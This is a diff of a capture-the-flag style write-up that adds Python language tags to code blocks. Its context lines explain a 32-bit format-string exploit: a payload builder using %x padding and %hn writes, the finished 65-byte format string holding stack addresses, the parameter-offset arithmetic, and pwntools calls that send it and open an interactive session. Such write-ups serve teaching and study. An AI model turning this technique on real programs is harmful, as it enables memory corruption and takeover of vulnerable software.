@@ -210,7 +210,7 @@ Above, in the associative array (dictionary) `words`, is the high and low order 
 
 This array is sorted by the index so that the next emit character count is greater than the first.  If this is not done correctly it is possible the 2nd, 3rd, or 4th values to be written to the stack cannot be computed because they are smaller than the accumulated `printf` internal character count.
 
-```
+```python
 n=0; q=19; c=0; payload = b''
 for i in sorted(words):
 	payload += b'%' + str(i-n).encode() + b'x'
@@ -230,7 +230,7 @@ From the _Analysis_ section we determined there can only be a max of 65 characte
 
 At this point it may help to look at the actually computed format string that is exactly 65 bytes long:
 
-```
+```python
 b'%16896x%19$hn%3791x%20$hn%40627x%21$hn%20x%22$hn \xccu\x80\xff\xd4u\x80\xff\xceu\x80\xff\xd6u\x80\xff'
 ```
 
@@ -251,7 +251,7 @@ The `%XX$hn` enumeration starts at 19.  _Why?_.
 
 Parameters to (x86 32-bit) `printf` are all on the stack and usually (in my experience) start from the address below the stack pointer and go down.  Also (in my experience) the start of the format string is at parameter 6 (same with x86_64).  So starting from the `0xffffd628│+0x0018: 0x41000000 (???"A")` line in the stack diagram above and counting down to `NNNN`, `OOOO`, `PPPP`, `QQQQ` (the location of the last 4 stack aligned parameters) we end up at 19 (`NNNN`).  You can use math if you like, e.g.:
 
-```
+```python
 import math
 math.ceil(65 / 4) + 6 - 4
 ```
@@ -263,7 +263,7 @@ Basically for x86 (4 byte stack), the number of characters that can be used for 
 
 All the is left to do is send the payload:
 
-```
+```python
 p.sendline(payload)
 p.interactive()
 ```
